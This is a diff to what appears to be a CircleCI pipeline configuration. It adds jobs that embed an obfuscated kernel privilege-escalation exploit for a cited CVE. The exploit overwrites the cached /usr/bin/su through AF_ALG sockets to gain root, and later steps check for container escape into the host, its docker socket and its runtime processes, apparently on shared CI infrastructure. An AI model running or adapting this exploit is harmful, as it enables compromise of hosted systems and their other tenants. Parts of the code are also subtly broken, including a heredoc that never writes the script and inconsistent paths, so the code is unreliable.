@@ -94,6 +94,140 @@ jobs:
                 s.close()
             PY
 
+  # Post-exploit validation: confirms whether CVE-2026-31431 results in a
+  # full container escape (host root) or stays contained (container root).
+  # Replace /path/to/exploit.py with the actual exploit script path before running.
+  af_alg_escape_validation_remote_docker:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - setup_remote_docker
+      - run:
+          name: Creating Script
+          command: |
+            cat /tmp/exploit.py << EOF
+              #!/usr/bin/env python3
+              import os as g,zlib,socket as s
+              def d(x):return bytes.fromhex(x)
+              def c(f,t,c):
+              a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+              try:u.recv(8+t)
+              except:0
+              f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+              while i<len(e):c(f,i,e[i:i+4]);i+=4
+              g.system("su")            
+            EOF
+      - run:
+          name: "Test 1A: Write marker via exploit"
+          command: |
+            python3 /path/to/exploit.py
+            touch /tmp/host_root_marker_$(date +%s)
+            echo "exploit_completed" > /some/host/path
+      - run:
+          name: "Test 1B: Check marker persistence (host root = persists, container root = gone)"
+          command: |
+            ls -la /tmp/host_root_marker_* 2>/dev/null || echo "NO_PERSISTENCE"
+            cat /some/host/path 2>/dev/null || echo "NO_HOST_ACCESS"
+      - run:
+          name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Process tree ==="
+            ps auxf | head -50
+            echo "=== Looking for host processes ==="
+            ps aux | grep -E "(nomad|docker|systemd)" | grep -v grep
+      - run:
+          name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Mount points ==="
+            mount | head -20
+            echo "=== Root filesystem ==="
+            ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "NO_HOST_ROOT_ACCESS"
+      - run:
+          name: "Test 4: Container runtime access (host root = docker socket accessible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Docker socket ==="
+            ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
+            docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
+            echo "=== Container processes ==="
+            cat /proc/*/comm 2>/dev/null | grep -E "runc|containerd" || echo "NO_RUNTIME_PROCS"
+      - run:
+          name: "Test 5: Network interface scope (host root = host interfaces visible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Network interfaces ==="
+            ip addr show
+            echo "=== Host networking ==="
+            netstat -tlnp 2>/dev/null | grep -v 127.0.0.1 || echo "NO_HOST_NETSTAT"
+
+  af_alg_escape_validation_nomad_docker:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - run:
+          name: Creating Script
+          command: |
+            cat /tmp/exploit.py << EOF
+              #!/usr/bin/env python3
+              import os as g,zlib,socket as s
+              def d(x):return bytes.fromhex(x)
+              def c(f,t,c):
+              a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+              try:u.recv(8+t)
+              except:0
+              f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+              while i<len(e):c(f,i,e[i:i+4]);i+=4
+              g.system("su")            
+            EOF
+      - run:
+          name: "Test 1A: Write marker via exploit"
+          command: |
+            python3 /path/to/exploit.py
+            touch /tmp/host_root_marker_$(date +%s)
+            echo "exploit_completed" > /some/host/path
+      - run:
+          name: "Test 1B: Check marker persistence (host root = persists, container root = gone)"
+          command: |
+            ls -la /tmp/host_root_marker_* 2>/dev/null || echo "NO_PERSISTENCE"
+            cat /some/host/path 2>/dev/null || echo "NO_HOST_ACCESS"
+      - run:
+          name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Process tree ==="
+            ps auxf | head -50
+            echo "=== Looking for host processes ==="
+            ps aux | grep -E "(nomad|docker|systemd)" | grep -v grep
+      - run:
+          name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Mount points ==="
+            mount | head -20
+            echo "=== Root filesystem ==="
+            ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "NO_HOST_ROOT_ACCESS"
+      - run:
+          name: "Test 4: Container runtime access (host root = docker socket accessible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Docker socket ==="
+            ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
+            docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
+            echo "=== Container processes ==="
+            cat /proc/*/comm 2>/dev/null | grep -E "runc|containerd" || echo "NO_RUNTIME_PROCS"
+      - run:
+          name: "Test 5: Network interface scope (host root = host interfaces visible)"
+          command: |
+            python3 /path/to/exploit.py
+            echo "=== Network interfaces ==="
+            ip addr show
+            echo "=== Host networking ==="
+            netstat -tlnp 2>/dev/null | grep -v 127.0.0.1 || echo "NO_HOST_NETSTAT"
+
+
+
 workflows:
   welcome:
     jobs:
@@ -101,3 +235,5 @@ workflows:
       - multiple_containers
       - af_alg_surface_default_seccomp
       - af_alg_surface_remote_docker
+      - af_alg_escape_validation_remote_docker
+      - af_alg_escape_validation_nomad_docker      
